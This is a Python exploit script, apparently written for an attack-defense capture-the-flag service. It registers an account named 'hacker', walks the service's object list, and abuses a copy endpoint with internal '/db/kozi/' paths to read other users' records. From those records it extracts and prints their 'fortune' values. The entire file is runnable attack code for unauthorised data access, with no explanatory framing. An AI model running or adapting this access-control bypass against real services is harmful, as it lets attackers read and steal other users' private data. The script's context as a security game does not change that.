import sys
import requests
import json

ip = sys.argv[1]

url = f"http://{ip}:9999/api"

l = requests.get(f"{url}/list/").json()['result']

s = requests.Session()

s.post(f"{url}/register/", json={
    "username": "hacker",
    "password": "hacker"
})

s.post(f"{url}/login/", json={
    "username": "hacker",
    "password": "hacker"
})

d = {}

for k in l[::-1]:
    try:
        r = s.post(f"{url}/copy_kozi/", json={
            "name": k.split('_')[1],
            "url": f"/db/kozi/{k}"
        })
        kozi = json.loads(r.text[26:-2])
        fortune = kozi['fortune']
        owner = kozi['owner']
        name = kozi['name']
        pipe = kozi.get('pipe')
        if pipe is not None and pipe in d:
            fortune += d[pipe]
        d[f"{owner}_{name}"] = fortune
        print(fortune)
    except:
        pass